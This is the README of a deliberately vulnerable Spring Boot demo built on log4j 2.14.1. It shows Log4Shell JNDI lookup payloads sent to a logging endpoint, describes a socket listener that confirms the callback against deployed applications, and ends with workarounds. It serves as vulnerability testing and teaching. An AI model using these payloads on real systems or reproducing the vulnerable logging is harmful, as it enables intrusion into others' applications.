### Exploiting log4j issue - No need of Burp Collaborator!
This is a basic Spring Boot app which demonstrate the Log4j vulnerability.
While testing different endpoints of your application, you might need Burp Collaborator (which comes in a professional edition only).
<br>
This program uses plain socket to ensure that the your application hit the provided malicious endpoint!

**About Log4j Issue**
<br>The world knows that there is a security vulnerability in log4j versions 2.10 to 2.14.1 (Also, the patches they released also have many vulnerabilities, so please check the apache site for exact versions).

This code uses log4j 2.14.1.<br>
A REST API accepts the request parameter (param name is '_input_') and simply logs it.
To exploit the vulnerability, try using something like this (encode it before sending) -> *_${jndi:ldap://localhost:8080}_*.

Request will look like - http://localhost:8080/logme?input=${jndi:ldap://localhost:8080/test}
<br>You will notice that the logger tries to contact this jndi endpoint. As this is a fake endpoint, it fails to connect and prints the exception trace on spring app console.

**No Burp Collaborator needed**<br>
Furthermore, I've now added a server socket, which listens on port 339.<br>
You want to test your existing deployments for log4j vulnerabilities. One way is to examine the application logs, may be using splunk, to see for any unexpected logging.
Other way is to pass the host:port provided by Burp Collaborator, and poll the collaborator to know if log4j inside the application has invoked Collaborator endpoints.
<br>Log4j basically uses client socket and contacts the <host:port> provided in the payload. <br>
Once you start the socket on local, now invoke the application URL from the browser as follows (please encode the param value before invoking):
*http://<application_hostname:port>/logme?input=${jndi:ldap://<socket_ip:port>}*
<br>
Note: If your application is deployed in cloud, ensure your socket IP is accessible to the internet. You may need to deploy the socket in cloud such as on EC2 instance.<br>
But this should work on all local/inside VPN deployments.
Once the above endpoint is invoked, you will see that the server socket received an incoming connection.<br>
Congratulations! You have successfully exploited the application.

**Mitigation**<br>
One way is to pass _*LOG4J_FORMAT_MSG_NO_LOOKUPS*_ environment variable by setting its value to true.
<br>Other workaround it by setting a system property _log4j2.formatMsgNoLookups=true_<br>
Note that these are just workarounds, they may not solve the vulnerability properly.<br>
Please visit Apache website for latest updates.
https://logging.apache.org/log4j/2.x/security.html

Cheers.
